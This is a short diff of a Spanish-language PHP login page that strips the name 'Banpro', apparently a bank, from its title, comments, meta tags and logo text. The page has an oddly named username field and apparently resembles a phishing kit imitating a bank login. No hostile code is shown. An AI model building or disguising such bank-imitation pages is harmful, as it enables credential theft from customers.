@@ -1,5 +1,5 @@
 <?php
-/* Banpro Login System v2.1 - Security Enhanced */
+/* Login System v2.1 - Security Enhanced */
 /* Generated: 2026-03-29 */
 /* Security Layer Active */
 session_start();
@@ -45,9 +45,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Banpro - Portal Seguro</title>
+    <title>Portal Seguro</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="generator" content="BanproSecure_v2.1">
+    <meta name="generator" content="Secure_v2.1">
     <meta name="timestamp" content="1711715400">
 </head>
 <body>
@@ -86,7 +86,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <div id="form-container" style="display:inline-block; text-align: center; border-radius: var(--border-radius); vertical-align: top; width: 500px;">
             <form method="post" action="index.php" id="loginForm" style="display: inline-block; width: 420px; height: 660px; border-radius:10px; background-image: url(1.svg); position: relative;">
                 <!-- Logo Section -->
-                <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;" alt="Banpro Logo">
+                <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;" alt="Logo">
                 <!-- Username Input -->
                 <input id="usernameField" name="ips1" placeholder="Usuario" type="text" required
                        class="secure-input"
